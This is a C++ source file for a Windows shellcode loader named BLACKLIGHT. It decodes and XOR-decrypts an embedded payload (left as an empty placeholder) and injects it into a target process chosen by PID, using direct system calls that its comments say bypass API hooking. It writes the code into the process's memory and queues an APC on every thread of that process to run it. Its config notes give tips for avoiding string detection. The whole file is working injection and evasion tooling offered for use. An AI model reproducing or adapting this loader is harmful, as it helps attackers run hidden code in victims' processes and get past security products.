// BLACKLIGHT.CPP
#include <Windows.h>
#include "base64.h"
#include "syscalls4.h" // CUSTOM SYSTEM CALLS TO BYPASS API HOOKING
#include <iostream>
#include <cstring>
#include <string>
#include <TlHelp32.h>
#include <vector>

using std::string;
using std::to_string;
using std::cout;
using std::endl;
using std::vector;

// PROTOTYPES
unsigned char* decryptKey(unsigned char*, size_t);
unsigned char* decryptXOR(unsigned char*, size_t);
void run(unsigned char*, size_t);
void debug(string);
void debug(char*);
void error(string);
void error(char*);

// GLOBALS
DWORD TARGET_PID;
BOOL DEBUG_MODE = false;
enum DECRYPTION_MODE {
	XOR_KEY = 1,
	BYTEWISE_XOR = 2
};

///////////////////////////////////////////////////////////////////////////////////////
// RUNNER CONFIG
///////////////////////////////////////////////////////////////////////////////////////

// TODO: PUT YOUR SC HERE
const string ENCODED_SC = "";

// TODO: IF USING BYTEWISE XOR, PUT KEY HERE IN DECIMAL OR HEX
const unsigned char BYTEWISE_XOR_KEY = 77;

// TODO: IF USING THE XOR KEY ENCRYPTION, CONFIG KEY AND LENGTH HERE.
// NOTE: DO NOT INCLUDE NULL BYTE (PREVENT STRING DETECTION) IN EITHER THE ARRAY OR IN THE LENGTH
const unsigned char XOR_KEY_STR[] = { 'S', 't', 'o', 'r', 'm', 'F', 'a', 'l', 'l' };
const size_t XOR_KEY_STR_LEN = 9;

// TODO: SET DECRYPTION MODE TO EITHER ENCRYPTION_KEY OR BYTEWISE_XOR
DECRYPTION_MODE DECR_MODE = XOR_KEY;

///////////////////////////////////////////////////////////////////////////////////////
// RUNNER CODE
///////////////////////////////////////////////////////////////////////////////////////

// MAIN HANDLES ARGUMENT PARSING AND INVOKING THE DECRYPTION AND ACTUAL RUN ROUTINES
int main(int argc, char** argv) {
	debug("hello, world");

	// ARGUMENTS
	// 1: TARGET PID
	// 2: DEBUG MODE

	if (argc < 2) {
		cout << "Invalid arguments, missing PID" << endl;
		exit(1);
	}
	else if (argc == 2) {
		DEBUG_MODE = false;
		TARGET_PID = atoi(argv[1]);

	}
	else if (argc == 3) {
		DEBUG_MODE = true;
		TARGET_PID = atoi(argv[1]);
		debug("Debug Mode activated");
		debug("Got target pid:");
		debug(argv[1]);
	}

	// DECODE B64 INTO BYTES
	debug("decoding sc");
	string decoded_sc = base64_decode(ENCODED_SC);
	unsigned char* decoded_bytes = (unsigned char*)decoded_sc.c_str();
	size_t sc_len = decoded_sc.length();

	// DECRYPT SC BYTES
	debug("decrypting sc");
	unsigned char* sc = nullptr;
	if (DECR_MODE == XOR_KEY) {
		sc = decryptKey(decoded_bytes, sc_len);
	}
	else {
		sc = decryptXOR(decoded_bytes, sc_len);
	}
	if (!sc) {
		error("Failed to decrypt sc!");
		exit(2);
	}
	else {
		debug("Successfully decrypted sc of length " + to_string(sc_len));
		run(sc, sc_len);
	}
}

// THE ACTUAL RUNNER
void run(unsigned char* sc, size_t sc_len) {

	PVOID remote_buffer = nullptr;
	HANDLE remote_process;
	HANDLE current_thread = NULL;
	OBJECT_ATTRIBUTES object_attributes;
	CLIENT_ID client_id;
	NTSTATUS error_code;
	

	debug("Launching runner");
	debug("Opening process " + to_string((int)TARGET_PID));
	
	object_attributes.Length = NULL;
	object_attributes.RootDirectory = NULL;
	object_attributes.ObjectName = NULL;
	object_attributes.Attributes = NULL;
	object_attributes.SecurityDescriptor = NULL;
	object_attributes.SecurityQualityOfService = NULL;
	

	// OPEN THE PROCESS. TODO: USE NtOpenProcess, BUT IT'S HARD TO FIGURE OUT THE PROCESS HANDLE AND THREAD HANDLE IN THE CLIENT_ID PARAMETER
	client_id.UniqueProcess = (HANDLE)TARGET_PID;	// CONVERT THE PROCESS ID TO A HANDLE
	client_id.UniqueThread = NULL;					// DON'T NEED A SPECIFIC THREAD....
	error_code = NtOpenProcess(&remote_process, PROCESS_ALL_ACCESS, &object_attributes, &client_id);
	if (!remote_process) {
		error("Failed to open remote process!");
		exit(3);
	}
	else {
		debug("Successfully opened the remote process!");
	}

	// ALLOCATE VIRTUAL MEMORY
	error_code = NtAllocateVirtualMemory(remote_process, &remote_buffer, 0, &sc_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	if (error_code) {
		error("Failed to allocate virtual memory");
		exit(4);
	}
	else {
		debug("Successfully allocated virtual memory");
	}
	
	// WRITE THE SC TO MEMORY
	size_t bytes_written = 0;
	error_code = NtWriteVirtualMemory(remote_process, remote_buffer, sc, sc_len, &bytes_written);
	if (error_code || !bytes_written || bytes_written < sc_len) {
		error("Failed to write sc to memory! Only wrote " + to_string(bytes_written) + "/" + to_string(sc_len) + " bytes to the remote process");
		exit(5);
	}
	else {
		debug("Wrote shellcode to memory");
	}

	// PROTECT THE SC
	ULONG old_protect = NULL;
	error_code = NtProtectVirtualMemory(remote_process, &remote_buffer, &sc_len, PAGE_EXECUTE_READ, &old_protect);
	if (error_code) {
		error("Failed to re-protect virtual memory!");
		exit(6);
	}
	else {
		debug("Re-protected virtual memory");
	}

	// GET A SNAPSHOT
	HANDLE snapshot = CreateToolhelp32Snapshot((TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD), 0);
	
	// GET A LIST OF THREAD IDS
	THREADENTRY32 thread_entry = { sizeof(THREADENTRY32) };
	vector<DWORD> thread_ids = vector<DWORD>();
	BOOL valid_thread = Thread32First(snapshot, &thread_entry);

	// ITERATE ACROSS A LIST OF THREADS GRABBING THREAD IDS, AND GET THE NEXT THREAD
	while (valid_thread) {
		if (thread_entry.th32OwnerProcessID == TARGET_PID) {
			thread_ids.push_back(thread_entry.th32ThreadID);
		}

		// GET THE NEXT THREAD
		valid_thread = Thread32Next(snapshot, &thread_entry);
	}
	debug("Found " + to_string(thread_ids.size()) + " injectable threads in remote process");

	// ITERATE ACROSS THREAD IDS, GRAB THE THREAD, AND QUEUE AN APC
	for (size_t k = 0; k < thread_ids.size(); k++) {

		DWORD tid = thread_ids.at(k);
		client_id.UniqueProcess = NULL;
		client_id.UniqueThread = (HANDLE)tid;

		error_code = NtOpenThread(&current_thread, THREAD_ALL_ACCESS, &object_attributes, &client_id);

		// IF IT ERRORS OUT, SKIP THIS THREAD
		if (error_code) {
			error("Failed to open thread " + to_string(tid) + ", error no " + to_string(error_code));
		}
		else {
			debug("Got handle to thread " + to_string(tid));
			// TODO: INJECTION HERE
			error_code = NtQueueApcThread(current_thread, (PKNORMAL_ROUTINE)remote_buffer, NULL, NULL, NULL);
			if (error_code) {
				error("Failed to queue APC for thread " + to_string(tid));
			}
			else {
				debug("Queued APC for thread " + to_string(tid));
			}
			NtClose(current_thread);
			debug("Closed handle to thread " + to_string(tid));
		}


	}

	// AT THE END, CLOSE THE HANDLE
	debug("Closing the process handle");
	NtClose(remote_process);

}

/////////////////////////////////////////////////////////////////////////////
// DECRYPTION ROUTINES
/////////////////////////////////////////////////////////////////////////////

//  DECRYPTION METHOD WITH XOR KEY
unsigned char* decryptKey(unsigned char* encryptedBytes, size_t length) {

	debug("Decrypting with key");

	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE

	// i IS THE INDEX IN THE SC
	// j IS THE INDEX IN THE KEY
	size_t j = 0;
	for (size_t i = 0; i < length; i++) {

		// IF WE'RE AT THE END OF THE KEY, GO BACK TO THE BEGINNING
		if (j == XOR_KEY_STR_LEN) {
			j = 0;
		}
		decrData[i] = encryptedBytes[i] ^ XOR_KEY_STR[j];
		j++;
	}
	decrData[length] = '\x00';
	return decrData;
}

// DECRYPT WITH BYTEWISE XOR, NOT RECOMMENDED
unsigned char* decryptXOR(unsigned char* encryptedBytes, size_t length) {

	debug("decrypting with bytewise xor");

	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE

	for (size_t i = 0; i < length; i++) {
		decrData[i] = encryptedBytes[i] ^ BYTEWISE_XOR_KEY;
	}
	decrData[length] = '\x00';
	if (DEBUG_MODE) cout << "finished decryption" << endl;
	return decrData;
}

/////////////////////////////////////////////////////////////////////////////
// DEBUGGING WRAPPERS
/////////////////////////////////////////////////////////////////////////////

void debug(string msg) {
	if (DEBUG_MODE) cout << "[+] " << msg << endl;
}
void debug(char* msg) {
	if (DEBUG_MODE) cout << "[+] " << msg << endl;
}

void error(string msg) {
	if (DEBUG_MODE) cout << "[!] " << msg << endl;
}
void error(char* msg) {
	if (DEBUG_MODE) cout << "[!] " << msg << endl;
}